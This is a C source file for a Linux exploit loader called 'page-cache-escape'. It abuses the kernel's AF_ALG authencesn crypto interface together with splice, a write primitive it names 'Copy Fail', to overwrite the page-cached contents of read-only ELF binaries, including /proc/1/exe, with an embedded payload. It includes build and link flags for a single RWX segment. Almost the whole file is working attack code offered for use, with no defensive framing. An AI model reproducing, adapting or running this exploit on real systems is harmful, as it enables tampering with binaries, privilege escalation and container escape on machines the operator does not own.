/*
 * injector.c - page-cache-escape loader
 *
 * Build: gcc -c -O2 -fPIC -nostdlib -fno-stack-protector -fno-asynchronous-unwind-tables -o rl.o injector.c
 * Link:  ld -N -shared -nostdlib -e _start -o injector.so rl.o
 *
 * The -N linker flag is required. It produces a single RWX LOAD segment so the
 * kernel can load this interpreter from the small page-cache window overwritten
 * through Copy Fail. A normal multi-segment layout is more likely to fail while
 * loading code pages.
 *
 * Constraint: keep state in static storage where possible. This code runs in an
 * unusual interpreter path where normal runtime assumptions are weak.
 */

typedef unsigned long u64;
typedef long i64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;
typedef unsigned long size_t;

static inline long sys1(long nr, long a1) { long r; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1):"rcx","r11","memory"); return r; }
static inline long sys2(long nr, long a1, long a2) { long r; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2):"rcx","r11","memory"); return r; }
static inline long sys3(long nr, long a1, long a2, long a3) { long r; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2),"d"(a3):"rcx","r11","memory"); return r; }
static inline long sys5(long nr, long a1, long a2, long a3, long a4, long a5) { long r; register long r10 __asm__("r10")=a4; register long r8 __asm__("r8")=a5; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2),"d"(a3),"r"(r10),"r"(r8):"rcx","r11","memory"); return r; }
static inline long sys6(long nr, long a1, long a2, long a3, long a4, long a5, long a6) { long r; register long r10 __asm__("r10")=a4; register long r8 __asm__("r8")=a5; register long r9 __asm__("r9")=a6; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2),"d"(a3),"r"(r10),"r"(r8),"r"(r9):"rcx","r11","memory"); return r; }

#define SYS_READ 0
#define SYS_OPEN 2
#define SYS_CLOSE 3
#define SYS_LSEEK 8
#define SYS_DUP2 33
#define SYS_PIPE 22
#define SYS_NANOSLEEP 35
#define SYS_SOCKET 41
#define SYS_ACCEPT 43
#define SYS_BIND 49
#define SYS_RECVFROM 45
#define SYS_RECVMSG 47
#define SYS_SENDMSG 46
#define SYS_SETSOCKOPT 54
#define SYS_EXIT 60
#define SYS_READLINK 89
#define SYS_SPLICE 275
#define AF_ALG 38
#define SOCK_SEQPACKET 5
#define SOL_ALG 0x117
#define ALG_SET_KEY 1
#define ALG_SET_IV 2
#define ALG_SET_OP 3
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5
#define ALG_OP_DECRYPT 0
#define MSG_MORE 0x8000
#define CMSG_ALIGN(n) (((n)+7)&~7)
#define SEEK_SET 0
#define AT_EXECFD 2
#define AT_NULL 0

#define PAYLOAD_MAX 4096
#define CF_AAD_SIZE 8
#define CF_CBUF_SIZE 128
#define CF_DRAIN_BUF_SIZE 8192
#define FD_SCAN_MIN 3
#define FD_SCAN_MAX 64
#define TARGET_RETRY_MAX 500
#define FD_PATH_BUF_SIZE 32
#define FD_LINK_BUF_SIZE 256

#define ERR_CF_SOCKET -1
#define ERR_CF_BIND -2
#define ERR_CF_SET_KEY -3
#define ERR_CF_ACCEPT -4
#define ERR_CF_SENDMSG -5
#define ERR_CF_PIPE -6
#define ERR_CF_SPLICE_IN -7
#define ERR_CF_SPLICE_OUT -8

struct sockaddr_alg { u16 family; u8 type[14]; u32 feat; u32 mask; u8 name[64]; };
struct iovec { void *base; size_t len; };
struct cmsghdr { size_t len; int level; int type; };
struct msghdr { void *name; u32 namelen; u32 _pad; struct iovec *iov; size_t iovlen; void *control; size_t controllen; int flags; };

static void *my_memset(void *s, int c, size_t n) { u8 *p=s; while(n--) *p++=(u8)c; return s; }
static void *my_memcpy(void *d, const void *s, size_t n) { u8 *dd=d; const u8 *ss=s; while(n--) *dd++=*ss++; return d; }

static const u8 key[40] = {0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};

// ============ Copy Fail write primitive backend ============

static struct sockaddr_alg cf_sa;
static u8 cf_aad[CF_AAD_SIZE];
static u8 cf_cbuf[CF_CBUF_SIZE];
static struct iovec cf_iov;
static struct msghdr cf_msg;
static int cf_pipefd[2] = {-1, -1};
static i64 cf_src_off;
static u8 cf_sink[CF_DRAIN_BUF_SIZE];
static struct iovec cf_drain_iov;
static struct msghdr cf_drain_msg;

static void close_raw_fd(long fd) {
    if (fd >= 0) sys1(SYS_CLOSE, fd);
}

static int copyfail_fail(long ctrl, long op, int err) {
    close_raw_fd(op);
    close_raw_fd(ctrl);
    return err;
}

static int copyfail_pipe_fail(long ctrl, long op, int err) {
    close_raw_fd(cf_pipefd[0]);
    close_raw_fd(cf_pipefd[1]);
    cf_pipefd[0] = -1;
    cf_pipefd[1] = -1;
    return copyfail_fail(ctrl, op, err);
}

static int copyfail_write4(int file_fd, i64 offset, u8 four_bytes[4]) {
    cf_pipefd[0] = -1;
    cf_pipefd[1] = -1;

    long ctrl = sys3(SYS_SOCKET, AF_ALG, SOCK_SEQPACKET, 0);
    if (ctrl < 0) return ERR_CF_SOCKET;

    my_memset(&cf_sa, 0, sizeof cf_sa);
    cf_sa.family = AF_ALG;
    my_memcpy(cf_sa.type, "aead", 5);
    my_memcpy(cf_sa.name, "authencesn(hmac(sha256),cbc(aes))", 34);

    if (sys3(SYS_BIND, ctrl, (long)&cf_sa, sizeof cf_sa) < 0)
        return copyfail_fail(ctrl, -1, ERR_CF_BIND);
    if (sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_KEY, (long)key, 40) < 0)
        return copyfail_fail(ctrl, -1, ERR_CF_SET_KEY);

    sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 0, 4);

    long op = sys3(SYS_ACCEPT, ctrl, 0, 0);
    if (op < 0) return copyfail_fail(ctrl, -1, ERR_CF_ACCEPT);

    cf_aad[0]='A'; cf_aad[1]='A'; cf_aad[2]='A'; cf_aad[3]='A';
    cf_aad[4]=four_bytes[0]; cf_aad[5]=four_bytes[1]; cf_aad[6]=four_bytes[2]; cf_aad[7]=four_bytes[3];

    my_memset(cf_cbuf, 0, sizeof cf_cbuf);
    u8 *p = cf_cbuf;
    struct cmsghdr *cm = (struct cmsghdr *)p;
    cm->len = sizeof(struct cmsghdr)+4; cm->level = SOL_ALG; cm->type = ALG_SET_OP;
    *(u32*)(p+sizeof(struct cmsghdr)) = ALG_OP_DECRYPT;
    p += CMSG_ALIGN(cm->len);
    cm = (struct cmsghdr *)p;
    cm->len = sizeof(struct cmsghdr)+4+16; cm->level = SOL_ALG; cm->type = ALG_SET_IV;
    *(u32*)(p+sizeof(struct cmsghdr)) = 16;
    p += CMSG_ALIGN(cm->len);
    cm = (struct cmsghdr *)p;
    cm->len = sizeof(struct cmsghdr)+4; cm->level = SOL_ALG; cm->type = ALG_SET_AEAD_ASSOCLEN;
    *(u32*)(p+sizeof(struct cmsghdr)) = 8;
    p += CMSG_ALIGN(cm->len);

    cf_iov.base = cf_aad; cf_iov.len = 8;
    my_memset(&cf_msg, 0, sizeof cf_msg);
    cf_msg.iov = &cf_iov; cf_msg.iovlen = 1;
    cf_msg.control = cf_cbuf; cf_msg.controllen = (size_t)(p - cf_cbuf);
    if (sys3(SYS_SENDMSG, op, (long)&cf_msg, MSG_MORE) < 0)
        return copyfail_fail(ctrl, op, ERR_CF_SENDMSG);

    if (sys1(SYS_PIPE, (long)cf_pipefd) < 0)
        return copyfail_fail(ctrl, op, ERR_CF_PIPE);

    cf_src_off = 0;
    long n = sys6(SYS_SPLICE, file_fd, (long)&cf_src_off, cf_pipefd[1], 0, (size_t)offset+4, 0);
    if (n <= 0)
        return copyfail_pipe_fail(ctrl, op, ERR_CF_SPLICE_IN);

    long rem = n;
    while (rem > 0) {
        long w = sys6(SYS_SPLICE, cf_pipefd[0], 0, op, 0, rem, 0);
        if (w <= 0)
            return copyfail_pipe_fail(ctrl, op, ERR_CF_SPLICE_OUT);
        rem -= w;
    }

    // Drain with a large enough buffer; too small can return EMSGSIZE before AEAD runs.
    cf_drain_iov.base = cf_sink; cf_drain_iov.len = CF_DRAIN_BUF_SIZE;
    my_memset(&cf_drain_msg, 0, sizeof cf_drain_msg);
    cf_drain_msg.iov = &cf_drain_iov; cf_drain_msg.iovlen = 1;
    sys3(SYS_RECVMSG, op, (long)&cf_drain_msg, 0);

    close_raw_fd(cf_pipefd[0]);
    close_raw_fd(cf_pipefd[1]);
    close_raw_fd(op);
    close_raw_fd(ctrl);
    return 0;
}

// ============ Vulnerability primitive interface ============

static int primitive_write4(int file_fd, i64 offset, u8 four_bytes[4]) {
    return copyfail_write4(file_fd, offset, four_bytes);
}

// ============ Payload area ============

static volatile struct __attribute__((packed)) {
    char marker[38];
    u64  len;
    u8   buf[PAYLOAD_MAX];
} payload __attribute__((used)) = {
    .marker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01",
    .len = 0,
    .buf = {0},
};

// ============ Target fd discovery ============

static u8 target_magic[4];
static int is_elf(int fd) {
    sys3(SYS_LSEEK, fd, 0, SEEK_SET);
    if (sys3(SYS_READ, fd, (long)target_magic, 4) != 4) return 0;
    return target_magic[0]==0x7f && target_magic[1]=='E' && target_magic[2]=='L' && target_magic[3]=='F';
}

static struct { u64 sec; u64 nsec; } target_retry_delay = {0, 10000000};

// Scan fd 3-64 for an already-open ELF.
static int scan_existing_elf_fd(void) {
    for (int i = FD_SCAN_MIN; i <= FD_SCAN_MAX; i++) {
        if (sys3(SYS_LSEEK, i, 0, SEEK_SET) >= 0 && is_elf(i))
            return i;
    }
    return -1;
}

static int find_target_fd(u64 *auxv) {
    // Method 1: AT_EXECFD from auxv.
    if (auxv) {
        for (u64 *p = auxv; p[0] != AT_NULL; p += 2) {
            if (p[0] == AT_EXECFD && is_elf((int)p[1]))
                return (int)p[1];
        }
    }

    // Method 2: scan already-open fds.
    {
        int fd = scan_existing_elf_fd();
        if (fd >= 0) return fd;
    }

    // Method 3: retry procfs exe paths while the runtime is still settling.
    for (int retry = 0; retry < TARGET_RETRY_MAX; retry++) {
        long fd;
        fd = sys2(SYS_OPEN, (long)"/proc/self/exe", 0);
        if (fd >= 0) {
            if (is_elf(fd)) return fd;
            sys1(SYS_CLOSE, fd);
        }
        fd = sys2(SYS_OPEN, (long)"/proc/thread-self/exe", 0);
        if (fd >= 0) {
            if (is_elf(fd)) return fd;
            sys1(SYS_CLOSE, fd);
        }
        fd = sys2(SYS_OPEN, (long)"/proc/1/exe", 0);
        if (fd >= 0) {
            if (is_elf(fd)) return fd;
            sys1(SYS_CLOSE, fd);
        }
        // Re-scan open fds on every retry.
        {
            int sfd = scan_existing_elf_fd();
            if (sfd >= 0) return sfd;
        }
        sys2(SYS_NANOSLEEP, (long)&target_retry_delay, 0);
    }
    return -1;
}

// ============ Overwrite engine ============

static u8 overwrite_block[4];
static u8 overwrite_link_buf[FD_LINK_BUF_SIZE];
static int overwrite_read_fd;

static int overwrite_target(int target_fd) {
    u64 plen = payload.len;
    if (plen == 0 || plen > PAYLOAD_MAX) return -1;

    // Resolve /proc/self/fd/<fd> back to a path and reopen it when possible.
    // Splicing from the real path fd targets the disk-backed page cache.
    overwrite_read_fd = target_fd;
    static u8 fd_path[FD_PATH_BUF_SIZE];
    fd_path[0]='/'; fd_path[1]='p'; fd_path[2]='r'; fd_path[3]='o';
    fd_path[4]='c'; fd_path[5]='/'; fd_path[6]='s'; fd_path[7]='e';
    fd_path[8]='l'; fd_path[9]='f'; fd_path[10]='/'; fd_path[11]='f';
    fd_path[12]='d'; fd_path[13]='/';
    // Append the target fd number to the path.
    int pos = 14;
    if (target_fd >= 10) fd_path[pos++] = '0' + (target_fd / 10);
    fd_path[pos++] = '0' + (target_fd % 10);
    fd_path[pos] = 0;

    long link_len = sys3(SYS_READLINK, (long)fd_path, (long)overwrite_link_buf, FD_LINK_BUF_SIZE - 1);
    if (link_len > 0) {
        overwrite_link_buf[link_len] = 0;
        long alt_fd = sys2(SYS_OPEN, (long)overwrite_link_buf, 0);
        if (alt_fd >= 0 && is_elf(alt_fd)) {
            overwrite_read_fd = alt_fd;
        } else if (alt_fd >= 0) {
            sys1(SYS_CLOSE, alt_fd);
        }
    }

    for (u64 i = 0; i < plen; i += 4) {
        u64 chunk = plen - i;
        if (chunk > 4) chunk = 4;
        my_memcpy(overwrite_block, (const void*)(payload.buf + i), chunk);
        if (chunk < 4) {
            sys3(SYS_LSEEK, overwrite_read_fd, i + chunk, SEEK_SET);
            sys3(SYS_READ, overwrite_read_fd, (long)(overwrite_block + chunk), 4 - chunk);
        }
        if (primitive_write4(overwrite_read_fd, i, overwrite_block) < 0) {
            if (overwrite_read_fd != target_fd) sys1(SYS_CLOSE, overwrite_read_fd);
            sys1(SYS_CLOSE, target_fd);
            return -1;
        }
    }
    if (overwrite_read_fd != target_fd) sys1(SYS_CLOSE, overwrite_read_fd);
    sys1(SYS_CLOSE, target_fd);
    return 0;
}

// ============ Entry point ============

static u64 *entry_auxv_from_stack(u64 *sp) {
    u64 argc = sp[0];
    u64 *p = sp + 1 + argc + 1; // envp[0], after argc + argv + NULL
    while (*p) p++;
    return p + 1;
}

// Keep assembly as a tiny trampoline: preserve the kernel-provided stack
// pointer, align rsp for C code, then jump to the C entry function.
__attribute__((naked)) void _start(void) {
    __asm__ volatile(
        "mov %%rsp, %%rdi\n"
        "and $-16, %%rsp\n"
        "jmp _start_main\n"
        :
        :
        : "rdi", "memory"
    );
}

__attribute__((used, visibility("hidden"))) void _start_main(u64 *initial_stack) {
    u64 *auxv = entry_auxv_from_stack(initial_stack);

    int fd = find_target_fd(auxv);
    if (fd < 0) sys1(SYS_EXIT, 10);

    if (fd != 3) {
        sys2(SYS_DUP2, fd, 3);
        sys1(SYS_CLOSE, fd);
        fd = 3;
    }

    int ret = overwrite_target(fd);
    sys1(SYS_EXIT, ret < 0 ? 1 : 0);
}
